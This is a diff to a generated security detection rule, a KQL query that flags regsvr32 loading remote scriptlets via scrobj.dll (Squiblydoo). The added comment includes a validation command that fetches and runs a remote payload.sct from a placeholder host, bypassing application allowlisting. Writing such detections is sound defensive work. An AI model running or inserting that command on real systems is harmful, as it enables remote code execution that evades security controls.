@@ -1,6 +1,8 @@
 // regsvr32 Scriptlet Execution (Squiblydoo)
 // Detects the Squiblydoo pattern where regsvr32 loads a remote scriptlet with /i and scrobj.dll, executing code through a signed binary and bypassing application allowlisting.
-// techniques: T1218.010   severity: critical
+// techniques: T1218.010   severity: critical   status: stable
+// validate: Atomic Red Team T1218.010
+//   regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
 // source: rules/execution/regsvr32-scriptlet-squiblydoo.yml  (GENERATED, do not edit by hand)
 Event
 | where (((NewProcessName endswith "\\regsvr32.exe")) and ((CommandLine has_any (dynamic(["scrobj", "/i:http", ".sct"])))))
